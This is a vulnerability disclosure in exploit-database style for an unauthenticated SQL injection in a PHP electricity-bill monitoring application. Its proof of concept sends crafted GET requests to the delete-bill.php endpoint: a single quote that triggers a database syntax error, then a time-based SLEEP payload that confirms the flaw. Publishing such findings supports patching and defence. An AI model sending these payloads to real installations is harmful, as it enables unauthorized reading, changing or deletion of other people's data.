# Electricity Consumption Monitoring Tool - Unauthenticated SQL Injection
+ *Exploit Title:* Electricity Consumption Monitoring Tool  - Unauthenticated SQL Injection
+ *Date:* 2024-04-24
+ *Exploit Author:* Asif Nawaz Minhas
+ *Vendor Homepage:* https://www.sourcecodester.com/php/17328/electricity-consumption-monitoring-tool-using-php-and-mysql-source-code.html
+ *Software Link:* https://download.code-projects.org/details/97b61777-5089-4b4f-841f-10e10be5859e
+ *Version:* 1.0
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* Reported, waiting for CVE number

## Description:
Electricity Consumption Monitoring Tool is vulnerable to a unauthenticated SQL injection vulnerability.  
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to http://localhost/electricity-comsumption-monitoring/
+ Click X to delete a bill
+ In your history you will see a bill id with the = parameter
+ Send this request again but modify it like this:
+ GET /electricity-comsumption-monitoring/endpoint/delete-bill.php?bill=6' HTTP/1.1
+ The response shows now:


Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax to use near ''6''' at line 1

Modify the payload now like this:

GET /electricity-comsumption-monitoring/endpoint/delete-bill.php?bill=%27%20AND%20(SELECT%207764%20FROM%20(SELECT(SLEEP(7)))BFNj)--%20SoMo HTTP/1.1

You will see a time out of 7 seconds, thus confirming the unauthenticated SQL injection vulnerability.




 ![XSS_1](https://github.com/ethicalhackerNL/CVEs/blob/fe099baf91dd62213fc46068b0aaafec5114c492/Electricity%20Consumption%20Monitoring%20Tool/unauth%20sqli%20proof.jpg)
